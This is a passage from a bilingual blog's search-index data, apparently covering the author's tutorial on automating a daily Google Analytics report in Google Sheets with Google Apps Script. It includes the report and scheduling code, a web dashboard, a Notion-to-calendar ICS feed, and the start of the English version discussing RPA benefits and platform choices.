this.sheetFields[currentRow]; const summaryRowIndex = parseInt(currentRow) + 1; const range = thisMonthSheet.getRange(summaryRowIndex, summaryColumnIndex); const style = sheetField.contentStyle; if (summaryRowIndex == 1) { // 日期... this.setContent(range, \"總計\", style); } else if (summaryRowIndex == 2) { // 星期...merge... const mergeRange = thisMonthSheet.getRange(1, summaryColumnIndex, summaryRowIndex, 1); this.setContent(mergeRange, \"總計\", style); mergeRange.merge(); } else { this.setContent(range, '=IFERROR(SUM(INDIRECT(SUBSTITUTE(ADDRESS(1, 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+'):INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN() - 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+')), 0)', style); } } return thisMonthSheet; } // 建立或取得日期的欄位 // 從最近一日往後加一欄位 makeOrGetDateColumn(sheet) { const firstRowColumnsRange = sheet.getRange(1, 1, 1, sheet.getLastColumn()); // 取得第一列(日期)資料範圍 const firstRowColumns = firstRowColumnsRange.getValues()[0]; // 取得資料範圍的值 0 = 第一列 var columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(this.date, \"GMT+8\", \"yyyy/MM/dd\"))); // 找到對應日期的欄位 Index if (columnIndex &lt; 0) { // Not Found，找到前一日的位子 var preDate = new Date(this.date); preDate.setDate(preDate.getDate() - 1); while(preDate.getMonth() == this.date.getMonth()) { columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(preDate, \"GMT+8\", \"yyyy/MM/dd\"))); if (columnIndex &gt;= 0) { break; } preDate.setDate(preDate.getDate() - 1); } if (columnIndex &gt;= 0) { columnIndex += 1; sheet.insertColumnsAfter(columnIndex, 1); // 在前一日欄位後新增一欄 columnIndex += 1; } } else { columnIndex += 1; } if (columnIndex &lt; 0) { sheet.insertColumnsAfter(1, 1); // 默認，直接新增一欄在第一欄後面 columnIndex = 2; } // 設定欄位寬度 sheet.setColumnWidths(columnIndex , 1, 100); return columnIndex } // 設定欄位 Format 樣式 setFormat(range, format) { if (format != null) { range.setNumberFormat(format); } } // 填充內容到欄位 setContent(range, text, style) { if (String(text) != \"\") { range.setValue(text); } range.setBackgroundColor(style.backgroundColor); range.setFontColor(style.color); if (style.bold) { range.setFontWeight(\"bold\"); } range.setHorizontalAlignment(style.horizontalAlignment); range.setVerticalAlignment(style.verticalAlignment); range.setFontSize(style.size); range.setBorder(true, true, true, true, true, true, \"black\", SpreadsheetApp.BorderStyle.SOLID); }}調整 Main.gs 增加資料串接並在構建階段賦值：const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { const date = new Date(); const gaData = new GAData(date); const inHouseReportData = fetchInHouseReportData(date); const report = new DailyReport(targetGoogleSheetID, date, gaData, inHouseReportData); report.execute(); }// 模擬部分數據資料可能是打其他平台 API 取得的。function fetchInHouseReportData(date) { // EXMAPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}完成後我們回到「 Main.gs 」選擇「debug」並按下偵錯，查看執行結果是否正確、有無出錯。回到 Google Sheet! 成功! 我們成功的自動新增了該日期的資料。5. 設定排程，每日自動執行腳本完成後，再來只要設定自動觸發條件，就能每日自動完成囉。調整 Main.gs 新增 cronjob() function:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { cronjob();}// 照現實狀況來說，通常是今日查昨日數據，才是完整的資料function cronjob() { const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const gaData = new GAData(yesterday); const inHouseReportData = fetchInHouseReportData(yesterday); const report = new DailyReport(targetGoogleSheetID, yesterday, gaData, inHouseReportData); report.execute();}// 模擬部分數據資料可能是打其他平台 API 取得的。function fetchInHouseReportData(date) { // EXMAPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}在編輯器上切換到「觸發條件」頁籤，選擇右下角「新增觸發條件」： 選擇您要執行的功能：剛新增的 Main.gs Function cronjob 選擇應執行的部署作業：上端 (Head, 意為最新版) 選取活動來源：時間驅動 選取時間型觸發條件類型：日計時器 選取時段：AM 4:00 — AM 5:00 (GMT+08:00)通常在 AM 4:00 一到就會執行。 錯誤通知設定：當腳本發生錯誤時是要馬上通知，還是每日彙整一次儲存設定，完成。之後可以去「執行項目」頁籤查看執行紀錄結果： 至此我們已完成自動化查詢、新增資料、填入資料的報表 RPA 功能．🎉🎉🎉搭建 Web GUI Dashboard再來有個次要需求，我們需要建立一個簡單的 Web 呈現每日數據（類似戰情中心的概念）會在團隊背後牆上大螢幕上直接顯示。效果如下圖：新增 Web_DailyReport.gs 撰寫讀取 Google Sheet 並將欄位、樣式轉換為 HTML 格式呈現：class WebDailyReport { constructor(sheetID, dayCount) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.dayCount = dayCount; this.sheetRows = [ \"日期\", \"星期\", \"日流量\", \"PC 流量\", \"Mobile 流量\", \"註冊數\" ]; } allData(startDate) { var sheetRowsIndexs = {}; var count = this.dayCount; var result = []; while (count &gt;= 0) { const preDate = new Date(startDate); preDate.setDate(preDate.getDate() - (this.dayCount - count)); const sheetName = Utilities.formatDate(preDate, \"GMT+8\", \"yyyy-MM\"); const targetSheet = this.separateSheet.getSheetByName(sheetName); if (targetSheet != null) { const firstRowColumnsRange = targetSheet.getRange(1, 1, 1, targetSheet.getLastColumn()); // 取得第一列(日期)資料範圍 const firstRowColumns = firstRowColumnsRange.getValues()[0]; // 取得資料範圍的值 0 = 第一列 var columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(preDate, \"GMT+8\", \"yyyy/MM/dd\"))); // 找到對應日期的欄位 Index if (columnIndex &gt;= 0) { columnIndex = parseInt(columnIndex) + 1; if (sheetRowsIndexs[sheetName] == undefined || sheetRowsIndexs[sheetName] == null) { sheetRowsIndexs[sheetName] = this.sheetRows.map((sheetRow) =&gt; this.getFieldRow(targetSheet, sheetRow)); } if (result.length == 0) { // 新增第一欄 const ranges = sheetRowsIndexs[sheetName].map((rowIndex) =&gt; (rowIndex != null) ? (targetSheet.getRange(rowIndex, 1)) : (null)); result.push(this.makeValues(ranges)); } const ranges = sheetRowsIndexs[sheetName].map((rowIndex) =&gt; (rowIndex != null) ? (targetSheet.getRange(rowIndex, columnIndex)) : (null)); result.push(this.makeValues(ranges)); } } count -= 1; } var transformResult = {}; for (const columnIndex in result) { for (const rowIndex in result[columnIndex]) { if (transformResult[rowIndex] == undefined) { transformResult[rowIndex] = []; } if (columnIndex == 0) { transformResult[rowIndex].unshift(result[columnIndex][rowIndex]); } else { transformResult[rowIndex].splice(1, 0, result[columnIndex][rowIndex]); } } } return transformResult; } // 轉換 欄位屬性 值成 顯示用物件 makeValues(ranges) { const data = ranges.map((range) =&gt; (range != null) ? (range.getDisplayValues()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const backgroundColors = ranges.map((range) =&gt; (range != null) ? (range.getBackgrounds()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const colors = ranges.map((range) =&gt; (range != null) ? (range.getFontColorObjects()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const sizes = ranges.map((range) =&gt; (range != null) ? (range.getFontSizes()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const bolds = ranges.map((range) =&gt; (range != null) ? (range.getFontWeights()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const horizontalAlignments = ranges.map((range) =&gt; (range != null) ? (range.getHorizontalAlignments()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const verticalAlignments = ranges.map((range) =&gt; (range != null) ? (range.getVerticalAlignments()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); var result = []; for(const index in data) { const row = data[index]; result.push({ \"value\": row, \"backgroundColor\": backgroundColors[index], \"color\": this.colorStripper(colors[index]?.asRgbColor()?.asHexString()), \"size\": sizes[index], \"bold\": bolds[index], \"horizontalAlignment\": this.alignConventer(horizontalAlignments[index]), \"verticalAlignment\": verticalAlignments[index] }); } return result; } colorStripper(colorString) { if (colorString == undefined || colorString == null) { return null } if (colorString.length == 9) { return \"#\"+colorString.substring(3, 9); } else { return colorString; } } alignConventer(horizontalAlignment) { if (horizontalAlignment == undefined || horizontalAlignment == null) { return null } return horizontalAlignment.replace('general-', '') } getFieldRow(sheet, name) { const firstColumnRowsRange = sheet.getRange(1, 1, sheet.getLastRow(), 1); // 取得第一欄(欄位)資料範圍 const firstColumnRows = firstColumnRowsRange.getValues(); // 取得資料範圍的值 const foundIndex = firstColumnRows.findIndex((firstColumnRow) =&gt; firstColumnRow[0] == name); if (foundIndex &lt; 0) { return null; } else { return foundIndex + 1; } }}Main.gs 增加 Web 請求 Handle：const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { cronjob();}function cronjob() { const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const gaData = new GAData(yesterday); const inHouseReportData = fetchInHouseReportData(yesterday); const report = new DailyReport(targetGoogleSheetID, yesterday, gaData, inHouseReportData); report.execute();}function doGet(e) { return HtmlService.createTemplateFromFile('Web_DailyReport_ Scaffolding').evaluate();}function getDailyReportBody() { const html = HtmlService.createTemplateFromFile('Web_DailyReport_Body').evaluate().getContent(); return html;}// FOR POST// function doPost(e) {// ref: https://developers.google.com/apps-script/guides/web?hl=zh-tw// }// 模擬部分數據資料可能是打其他平台 API 取得的。function fetchInHouseReportData(date) { // EXMAPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}新增 Web_DailyReport_ Scaffolding.html Web Dashboard 框架，由於我們的戰情室螢幕要做到自動更新內容，因此我們建立一個 Web 骨架，在其中定時用 Ajax 去撈取 HTML 內容：&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;base target=\"_top\"&gt; &lt;script&gt; function onSuccess(html) { if (html != null) { var div = document.getElementById('result'); div.innerHTML = html; } } setInterval(()=&gt;{ google.script.run.withSuccessHandler(onSuccess).getDailyReportBody() }, 1000 * 60 * 60 * 1); google.script.run.withSuccessHandler(onSuccess).getDailyReportBody(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"result\"&gt;Loading...&lt;/div&gt; &lt;/body&gt;&lt;/html&gt;新增 Web_DailyReport_Body.html 實際渲染資料成 HTML 的地方：&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;base target=\"_top\"&gt; &lt;style&gt; table { border-collapse: collapse; width: 100%; text-align: center; } th, td { border: 1px solid #000000; padding: 8px; text-align: center; font-size: 36px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 style=\"text-align:center\"&gt;ZHGCHG.LI&lt;/h1&gt; &lt;table id=\"dataTable\"&gt; &lt;tbody&gt; &lt;? // 顯示近 7 天數據 const dashboard = new WebDailyReport(targetGoogleSheetID, 7); // 從昨天開始 const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const data = dashboard.allData(yesterday); for(const rowIndex in data) { const row = data[rowIndex]; ?&gt; &lt;tr&gt; &lt;? for(const columnIndex in row) { const column = row[columnIndex]; ?&gt; &lt;td style=\"background-color: &lt;?=column[\"backgroundColor\"]?&gt;; color: &lt;?=column[\"color\"]?&gt;; text-align: &lt;?=column[\"horizontalAlignment\"]?&gt;;\"&gt; &lt;?=column[\"value\"]?&gt; &lt;/td&gt; &lt;? } ?&gt; &lt;/tr&gt; &lt;? } ?&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;script&gt; &lt;/body&gt;&lt;/html&gt; 請注意，我們是從昨天開始往後撈 7 天的數據做比對，不會顯示今天的數據。完成以上步驟後的專案檔案目錄如下：測試部署：點擊專案右上角「部署」-&gt;「測試部署作業」 部署完成點擊網址即可查看測試結果。 請注意此網址僅共一次性測試使用，如果程式碼有調整要再重新點一次測試部署作業。卡在 Loading… 內容沒出來或出現伺服器錯誤，可以回到編輯器的「執行項目」頁籤查看錯誤訊息：完成正式部署：如果測試沒問題就可以完成正式部署，釋出網址。點擊專案右上角「部署」-&gt;「新增部署作業」-&gt; 左上角「選取類型」-&gt;「網頁應用程式」： 執行身份：預設為當前帳號(同 Google Apps Script 使用者) 誰可以存取：設為所有人只要知道網址的人都能存取、也可設為僅組織可存取，會先要求 Google 登入才能存取。 部署完成，取得網址。程式碼有更動需重新部署才會生效：請注意當程式碼有變動時，需要重新部署(網址不會變)，更動才會生效，否則會一直是舊的。點擊專案右上角「部署」-&gt;「管理部署作業」：點擊右上角「筆🖊️ ICON」-&gt; 「版本」 -&gt;「建立新版本」-&gt;「部署」。部署完成後點擊網址，或回到原網址重新整理即可看到新的更動結果。🎉🎉完成！至此我們所有的 RPA 需求皆已完成。🎉🎉最終成果：(改程式回補本月數據，否則全新資料下只有昨日一筆) https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec完整 Google Sheet Demo： Google Sheet:https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit?usp=sharing Web GUI URL:https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec Google Apps Script: https://script.google.com/home/projects/1vHgXPTV_q8MC75FVzAEtzD2JPVnPBpMfFXbjZR7SLMVjoEH1FcjKlo8l/edit最後附上其他日常生活應用：Robotic Process Automation with Google Apps Script — Github Repo Star Notifier to LineRobotic Process Automation with Google Apps Script — Notion Database to Calendar之前簡易實現的 Notion to Calendar 功能。 實現方式是，我去串接 Notion API 撈取 Database 資料並套用產出 ICS 格式網頁，部署成公開的網頁；將此網址新增到 Apple Calendar 即可。Main.gs :// Constant variablesconst notionToken = \"XXXXX\";const safeToken = \"XXXXX\";function doGet(e) { const ics = HtmlService.createTemplateFromFile('ics'); if (e.parameter.token != safeToken) { return ContentService.createTextOutput(\"Access Denied!\"); } ics.events = getQuickNote(); return ContentService.createTextOutput(ics.evaluate().getContent()).setMimeType(ContentService.MimeType.ICAL);}function debug() { const ics = HtmlService.createTemplateFromFile('ics'); ics.events = getQuickNote(); Logger.log(ics.evaluate().getContent());}function getQuickNote() { // YOUR FILTER Condition: const payload = { \"filter\": { \"and\": [ { \"property\": \"Date\", \"date\": { \"is_not_empty\": true } } , { \"property\": \"Name\", \"title\": { \"is_not_empty\": true } } ] } }; const result = getDatabase(YOUR_DATABASE_ID, payload); var events = []; for (const index in result.results) { const item = result.results[index] const properties = item.properties; const id = item['id']; const create = toICSDate(item[\"created_time\"]); const edit = toICSDate(item[\"last_edited_time\"]); const startDate = properties['Date']['date']['start']; const start = toICSDate(startDate); var endDate = properties['Date']?.['date']?.['end']; if (endDate == null) { endDate = startDate; } const end = toICSDate(endDate); const type = properties['Type']?.['multi_select']?.[0]?.['name']; const title = \"[\"+type+\"] \"+properties?.['Name']?.['title']?.[0]?.['plain_text']; const description = item['url']; events.push( { \"id\":id, \"create\":create, \"edit\":edit, \"start\":start, \"end\":end, \"title\":title, \"description\":description } ) } return events;}// TO UTC Datefunction toICSDate(date) { const icsDate = new Date(date); icsDate.setHours(icsDate.getHours() - 8); return Utilities.formatDate(icsDate, \"GMT+8\", \"yyyyMMdd'T'HHmmss'Z'\");// 20240304T132300Z}// Notionfunction getDatabase(id, payload) { const url = 'https://api.notion.com/v1/databases/'+id+'/query/'; const options = { method: 'post', headers: { 'Authorization': 'Bearer '+notionToken, 'Content-Type': 'application/json', 'Notion-Version': '2022-06-28' }, payload: JSON.stringify(payload) }; const result = UrlFetchApp.fetch(url, options); return JSON.parse(result.getContentText());}ics.html :BEGIN:VCALENDARPRODID:-//Google Inc//Google Calendar 70.9054//ENVERSION:2.0CALSCALE:GREGORIANMETHOD:PUBLISHX-WR-CALNAME:NotionCalendarX-WR-TIMEZONE:Asia/TaipeiBEGIN:VTIMEZONETZID:Asia/TaipeiX-LIC-LOCATION:Asia/TaipeiBEGIN:STANDARDTZOFFSETFROM:+0800TZOFFSETTO:+0800TZNAME:CSTDTSTART:19700101T000000END:STANDARDEND:VTIMEZONE&lt;? for(const eventIndex in events) { const event = events[eventIndex]; ?&gt;BEGIN:VEVENTDTSTART:&lt;?=event[\"start\"]?&gt;DTEND:&lt;?=event[\"end\"]?&gt;DTSTAMP:&lt;?=event[\"edit\"]?&gt;UID:&lt;?=event[\"id\"]?&gt;CREATED:&lt;?=event[\"create\"]?&gt;LAST-MODIFIED:&lt;?=event[\"edit\"]?&gt;SEQUENCE:0STATUS:CONFIRMEDSUMMARY:&lt;?=event[\"title\"]?&gt;DESCRIPTION:&lt;?=event[\"description\"]?&gt;TRANSP:OPAQUEEND:VEVENT&lt;? }?&gt;END:VCALENDAR同前文，部署成網頁服務，點擊專案右上角「部署」-&gt;「新增部署作業」-&gt; 左上角「選取類型」-&gt;「網頁應用程式」： 誰可以存取要選所有人，因為無法在加 Calendar 時進行 Google 登入驗證。將網址新增至行事曆訂閱，完成 🎉🎉🎉🎉 ！工商時間如果您與您的團隊有自動化工具、流程串接需求，不論是 Slack App 開發、Notion、Asana、Google Sheet、Google Form、GA 數據，各種串接需求，歡迎與我 聯絡開發 。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 3,685 Total Views Last Statistics Date: 2025-08-15 | 3,602 Views on Medium." }, { "title": "Implementing Daily Data Report RPA Automation with Google Apps Script", "url": "/posts/zrealm-robotic-process-automation/en/implementing-daily-data-report-rpa-automation-with-google-apps-script-f6713ba3fee3/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, roboticprocessautomation, rpa-solutions, google-apps-script, google-sheets", "date": "2024-04-14 23:16:45 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Implementing Daily Data Report RPA Automation with Google Apps ScriptRobotic Process...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Implementing Daily Data Report RPA Automation with Google Apps ScriptRobotic Process Automation (RPA) for Google Workspace services using Google Apps ScriptPhoto by Possessed PhotographyRobotic Process AutomationRPA (Robotic Process Automation) translates to “Process Automation Robot” in Chinese. Looking back at human history, from manual gathering to the Stone Age, then to agricultural civilization, and from the industrial revolution of the last century to the rise of information technology in the past 20 years, human work efficiency and productivity have seen exponential growth. Throughout this journey, RPA applications have been ubiquitous: the waterwheel in the agricultural era (automating the threshing process), the textile machines of the industrial revolution (automating textile work), factory robotic arms (automating assembly tasks), and finally, the automation of information-related tasks, such as automatic report queries and notifications, which this article will introduce.I must admit, I only recently learned this term. Since my first job seven years ago, I have been doing RPA-related tasks, such as writing web scrapers for data statistics, automating CI/CD processes, automating data queries, automating stability data alerts, and automating daily routine operations. However, I previously referred to it simply as “automation.” It’s time to give it a proper name — RPA (Robotic Process Automation).Previously, my RPA efforts focused more on “writing code to automate tasks to solve individual problems,” lacking a comprehensive evaluation and analysis in the early stages, the use of No/Low Code tools, regulatory considerations, operational monitoring, actual data statistics, continuous improvement, and promoting corporate culture. All of these are essential for a complete RPA implementation. However, as mentioned earlier, I only recently became aware of this professional field, so let me start by sharing a practical article!There are many platforms that provide RPA services, such as Automation Anywhere, UiPath, Microsoft Power Automate, Blue Prism, or Zapier, IFTTT, Automate.io… You should choose the appropriate service based on the specific problem you want to solve.I recommend a free, open-source, browser-based RPA tool: Automa. Additionally, broadly speaking, transforming the active dependency between people or between people and tasks into a dependency on platforms is also a form of RPA. For example: uniformly using project management tools like Asana/Jira to manage work tasks. Based on the concept of transforming active to passive, we can implement an RPA that automatically notifies us when there are new changes, instead of manually checking for new notifications. For instance: the previously implemented Gmail to Slack that forwards specific notification emails to work groups.Benefits Assessment of Robotic Process AutomationPreviously, in the “2021 Pinkoi Tech Career Talk — Secrets of High-Efficiency Engineering Teams,” I shared the cost issues of incremental gains and flow interruptions. Suppose a repetitive task takes 15 minutes each time and occurs 10 times a week; over a year, that amounts to nearly 130 hours wasted. If we also consider the cost of “switching flow,” we might end up wasting nearly 200 hours a year.2021 Pinkoi Tech Career Talk — Secrets of High-Efficiency Engineering Teams The term “flow switching” refers to the time spent when we are focused on important tasks and need to pause to handle other matters, then return to regain our focus.The benefits assessment for developing RPA can refer to the diagram below; as long as the time required for development and the frequency of occurrence exceed the wasted time, it is worth investing resources to implement:https://twitter.com/swyx/status/1196401158744502272 X-axis: Task occurrence frequency, e.g., 50/Day (50 times a day) Y-axis: The amount of human time required to complete each task The time cost range is calculated over the past 5 years, with the middle of the table indicating the wasted time and labor costs over 5 years White indicates that the potential time cost for automation is less than the benefits gained, making it not worth improving Green indicates tasks worth automating Red strongly suggests transitioning to automation In addition to saving time, automated standardized processes can also reduce the likelihood of human error and enhance stability.The Relationship Between Robotic Process Automation and AIWith the rise of AI, RPA is often mentioned; however, I believe there is no direct relationship between RPA and AI. RPA existed long before the era of AI, and the benefits of implementing AI may not surpass those of a well-established RPA. RPA is more about corporate culture and work habits. However, it is undeniable that AI can indeed help RPA reach the next level. For example, while RPA could only perform precise, routine tasks in the past, with AI, it can handle more ambiguous, dynamic, and intelligent decision-making tasks.Robotic Process Automation at Google WorkspaceGoogle Workspace (formerly G Suite) is a great partner for our daily office collaboration. We use Gmail for email, Google Docs for documents, Google Sheets for reports, and Google Forms for forms… The integration of these services or communication with internal and external systems requires us to implement RPA.However, Google does not provide direct RPA services, but we can achieve this through the following services: No Code: App Sheet (paid service) allows non-developers to build service integrations through a GUI. Low Code: Google Apps Script (free service) enables quick and direct bridging of Google services and external/internal systems with simple programming. Function as a Service: Cloud Functions (paid service with free tier) allows you to write complete code and services, which can be deployed and executed directly through Google Cloud.I have not worked with the No Code platform App Sheet, but I have considerable experience with Cloud Functions and Google Apps Script. Below are some personal experiences and insights from my previous usage:Cloud Functions Requires deployment to execute Supports multiple programming languages: Node.js, Python, Java, Go, PHP, Ruby… Supports third-party package dependency management, installation, and usage Supports a complete authentication mechanism Maximum execution time limit: 60 minutes Pay for what you use: charges based on the number of executions, execution time, different processors, and memory used Subject to cold start issues (if not called for a long time, the first call will require a longer response time) Cannot directly connect to Google services; requires Auth/API authentication Free tier details: Cloud Functions offers a permanent free tier for computing time resources, including GB/second and GHz/second allocations. In addition to 2 million calls, this free tier also provides 400,000 GB/seconds and 200,000 GHz/seconds of computing time, as well as 5 GB of internet data transfer per month. The usage quota for the free tier is calculated based on the equivalent dollar amount of the above level 1 pricing. Regardless of whether the execution function’s region uses level 1 or level 2 pricing, the system will allocate an equivalent dollar amount to you. However, when deducting the free tier quota, the system will follow the function execution region’s level (level 1 or level 2).Please note that even if you are using the free tier, you must have a valid billing account.In summary, Cloud Functions is recommended for more complete and complex RPA integration functions or when there are more external API integration needs.Previous use cases for Cloud Functions include: [Slack ChatGPT Conversation Bot]: Slack &amp; ChatGPT Integration [Automated Check-in Bot]: Using Python + Google Cloud Platform + Line Bot to Automate Routine TasksThese are used when integrating with non-Google Workspace services and bridging other external services.Google Apps Script Convenient, simple, and quick Completely free No complicated Auth authentication required for service integration(Google Apps Script uses the currently executing account as the execution identity) Built-in scheduling and calendar trigger functions Uses Google network to execute web requests Can only be developed using Google Apps Script (based on JavaScript) Does not support package management tools, no version control features Due to security issues, customizing Request User-Agent information is not allowed Execution time limit: scripts must complete work within 6 minutes, or they will be terminated. For other limitations and quotas, please refer to the official GAS information:Previous use cases for Google Apps Script include: [Integrating Slack x Google Form x Google Sheet]: Creating a Fully Automated WFH Employee Health Status Reporting System [Integrating Slack x Gmail]: Using Google Apps Script to Forward Gmail Emails to Slack [Integrating Google Analytics x Slack]: Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate [Integrating Firebase Crashlytics x Big Query x Slack]: Crashlytics + Big Query for a More Immediate and Convenient Crash Tracking Tool [Integrating Github x LineBot]: Using Google Apps Script to Create a Free Github Repo Star Notifier in Three StepsDue to execution time and API request customization limitations, I only use Google Apps Script for simple and quick services; or when there is a need to integrate with Google services, I prefer to use Google Apps Script (because using Cloud Functions requires implementing the complete Google service authentication process).Robotic Process Automation with Google Apps Script — Daily Work Report (Google Sheet x Google Analytics)Finally, we arrive at the main topic of this article: using Google Apps Script to implement RPA automation for Google services.BackgroundThe product team needs to query Google Analytics data daily and fill it into a Google Sheet data report for team analysis of trends. They also need to publish the daily data content on a dashboard screen to keep all members informed of the current status.Colleagues spend about 30 minutes each day upon arriving at the office to complete this task; if there are other matters to handle, they must wait until this routine work is finished before starting or may delay the publication of daily data messages.A simple estimate of RPA benefits: Annual consumption:1 person x 30 mins x 365 days (holiday data also needs to be filled) = 182 hours Automation setup cost:In this case, it would take about 1 person x 5 days = 40 hours Therefore, we only need to invest one week of development time to solve the work consumption of the colleague responsible for data checking in the long term, allowing them to focus on more important tasks.GoalOur goal is to use Google Apps Script to create an RPA that automatically retrieves daily data from Google Analytics and internal system report APIs and fills it into Google Sheets, as well as to build a Web UI Dashboard.Final Effect Google Sheet:https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit?usp=sharing Web GUI URL:https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec The data is dummy data for demo purposes; starting from 2024/04/13, it will be particularly low or remain at 0, as my zhgchg.li GA truly has “0” traffic Q_Q.Tasks to Complete Create Google Apps Script and familiarize yourself with the editor Obtain/create the corresponding date’s Sheet Connect to Google Analytics to retrieve data Populate the data Set up a schedule for daily automatic executionDeclarationDue to the explanatory nature of the article, the following code will be kept as simple as possible to enhance clarity. You can modify it according to your actual needs. At the end of the article, I have attached the complete public Google Sheet &amp; Google Apps Script. If you prefer not to go step by step, you can directly modify the template attached at the end of the article.Step 1. Create Google Apps ScriptSimply select “Extensions” -&gt; “Apps Script” on the report you want to automate, and it will automatically create a Google Apps Script linked to the Google Sheet report.Additionally, you can create a [Google Apps Script](https://www.google.com/script/start/){:target=\"_blank\"} directly from the Google Apps Script homepage, but this will not link it to Google Sheets.&gt; **You do not need a link to operate with the corresponding Google Sheet.** Both methods of creation are valid; the difference lies in the ownership of the script. If it is linked to a report, it belongs to the report owner. If created by yourself, it belongs to the creator. Ownership is important because if that account is deactivated due to leaving the company, the script may become invalid or be deleted.![](/assets/f6713ba3fee3/1*vnCPiALLTi4CIcYbASQpOg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NTAiIGhlaWdodD0iMzI2Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }After creating the script, we can rename our script project name from the top.#### Basic Knowledge of Google Apps ScriptBefore moving on to writing the program, let's cover some basic knowledge of Google Apps Script.**About the Editor**By default, the SDKs for Google services are included (no special import is needed to call them):- CalendarApp Calendar- DocumentApp Google Drive- FormApp Google Form- SpreadsheetApp Google Sheet- GmailApp Gmail- [Others…](https://developers.google.com/apps-script/reference/slides/border?hl=zh-tw#getdashstyle){:target=\"_blank\"}![](/assets/f6713ba3fee3/1*PKO-daNhyquINvk-_LfgQQ.webp){: 